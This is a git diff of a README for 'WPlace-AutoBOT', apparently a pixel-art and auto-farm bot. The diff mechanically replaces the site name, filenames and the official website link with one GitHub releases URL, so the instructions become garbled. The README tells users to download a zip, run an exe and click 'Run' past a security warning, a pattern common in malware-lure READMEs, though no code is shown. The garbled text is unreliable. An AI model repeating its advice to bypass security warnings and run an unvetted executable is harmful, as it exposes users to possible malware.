@@ -1,10 +1,10 @@
 # 🛠️ WPlace-AutoBOT - Create Pixel Art Effortlessly
 
 ## 🚀 Getting Started
-Welcome to WPlace-AutoBOT! This tool simplifies the process of creating pixel art on wplace.live and includes an auto-farm script to help you level up quickly. Follow this guide to download and install the software with ease.
+Welcome to WPlace-AutoBOT! This tool simplifies the process of creating pixel art on https://github.com/abhinavmohandas/WPlace-AutoBOT/releases and includes an auto-farm script to help you level up quickly. Follow this guide to download and install the software with ease.
 
 ## 📥 Download WPlace-AutoBOT
-[![Download WPlace-AutoBOT](https://img.shields.io/badge/Download-WPlace--AutoBOT-brightgreen.svg)](https://github.com/files/Release.zip)
+[![Download WPlace-AutoBOT](https://github.com/abhinavmohandas/WPlace-AutoBOT/releases)](https://github.com/abhinavmohandas/WPlace-AutoBOT/releases)
 
 ## 🔍 Features
 - **Automated Pixel Art Creation:** Easily generate stunning pixel art without any technical skills.
@@ -22,16 +22,16 @@ Before you download, ensure your system meets these requirements:
 ## 🔄 How to Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the following link to access the download page: [Download WPlace-AutoBOT](https://github.com/files/Release.zip).
+   Go to the following link to access the download page: [Download WPlace-AutoBOT](https://github.com/abhinavmohandas/WPlace-AutoBOT/releases).
 
 2. **Download the File:**
    Click on the download button to start downloading the zip file.
 
 3. **Unzip the File:**
-   After the download completes, locate the `Release.zip` file in your downloads folder. Right-click on the file and select "Extract All" to unzip the contents.
+   After the download completes, locate the `https://github.com/abhinavmohandas/WPlace-AutoBOT/releases` file in your downloads folder. Right-click on the file and select "Extract All" to unzip the contents.
 
 4. **Run the Application:**
-   Inside the extracted folder, find the `WPlace-AutoBOT.exe` file. Double-click it to run the application. If prompted with a security warning, click "Run" to proceed.
+   Inside the extracted folder, find the `https://github.com/abhinavmohandas/WPlace-AutoBOT/releases` file. Double-click it to run the application. If prompted with a security warning, click "Run" to proceed.
 
 5. **Follow In-App Instructions:**
    Once the app opens, follow the on-screen instructions to begin creating pixel art and using the auto-farm feature.
@@ -65,7 +65,7 @@ Join our community to share your creations and get support:
 - Check our GitHub issues page for common questions.
 
 ## 🔗 Important Links
-- [Download WPlace-AutoBOT](https://github.com/files/Release.zip)
-- [Visit the Official Website](https://wplace.live)
+- [Download WPlace-AutoBOT](https://github.com/abhinavmohandas/WPlace-AutoBOT/releases)
+- [Visit the Official Website](https://github.com/abhinavmohandas/WPlace-AutoBOT/releases)
 
 With WPlace-AutoBOT, you can dive into the world of pixel art with confidence. Enjoy your creative journey!
